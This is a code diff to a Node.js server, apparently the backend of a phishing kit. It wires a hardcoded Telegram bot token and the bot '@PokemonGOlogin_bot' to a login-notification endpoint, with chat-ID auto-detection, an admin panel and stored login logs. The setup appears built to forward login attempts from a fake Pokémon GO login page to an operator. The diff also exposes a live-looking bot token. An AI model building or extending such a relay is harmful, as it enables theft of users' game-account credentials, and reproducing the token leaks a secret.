@@ -17,7 +17,7 @@ const BOT_TOKEN = "8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM".replace(
   /\s/g,
   "",
 ); // Fix: Remove any spaces
-const CHAT_ID = "YOUR_CHAT_ID_HERE"; // You need to get your chat ID
+let CHAT_ID = "YOUR_CHAT_ID_HERE"; // Will be auto-detected
 
 // Get chat ID helper function
 async function getChatId() {
@@ -42,17 +42,18 @@ async function getChatId() {
         try {
           const response = JSON.parse(data);
           if (response.result && response.result.length > 0) {
-            const chatId = response.result[0].message.chat.id;
+            // Get the most recent message
+            const latestMessage = response.result[response.result.length - 1];
+            const chatId = latestMessage.message.chat.id;
+            CHAT_ID = chatId; // Store the chat ID
             console.log(`🔍 Found Chat ID: ${chatId}`);
             resolve(chatId);
           } else {
-            console.log(
-              "❌ No messages found. Send a message to your bot first!",
-            );
+            console.log('❌ No messages found. Send a message to @PokemonGOlogin_bot first!');
             resolve(null);
           }
         } catch (error) {
-          console.error("❌ Error parsing response:", error);
+          console.error('❌ Error parsing response:', error);
           resolve(null);
         }
       });
@@ -305,25 +306,30 @@ app.listen(PORT, async () => {
       console.log(
         `✅ Bot connected: ${botInfo.first_name} (@${botInfo.username})`,
       );
+      console.log("📱 Send a message to @PokemonGOlogin_bot to enable notifications");
     } else {
       console.log("❌ Bot token invalid or bot not found");
       console.log("   Current Token:", BOT_TOKEN);
     }
   }
 
-  if (CHAT_ID === "YOUR_CHAT_ID_HERE") {
-    console.log(
-      "⚠️  Chat ID not configured. Send a message to @PokemonGOlogin_bot first!",
-    );
-    console.log("💡 Then the server will automatically detect your Chat ID");
+  // Try to get chat ID automatically
+  const autoChatId = await getChatId();
+  if (autoChatId) {
+    console.log(`✅ Chat ID auto-detected: ${autoChatId}`);
+    console.log("📨 Telegram notifications are now active!");
   } else {
-    console.log(`✅ Chat ID configured: ${CHAT_ID}`);
+    console.log("⚠️  Chat ID not found. Send a message to @PokemonGOlogin_bot first!");
+    console.log("💡 Then restart the server or wait for next login attempt");
   }
 
   console.log("🔗 API Endpoints:");
   console.log(`   POST /api/login - Send login notification`);
   console.log(`   GET  /api/health - Server health check`);
   console.log(`   GET  /api/bot-status - Bot configuration status`);
+  console.log(`   POST /api/admin/login - Admin panel login`);
+  console.log(`   GET  /api/admin/logs - Get login logs (admin only)`);
+  console.log(`   GET  /admin - Admin panel interface`);
 });
 
 module.exports = app;
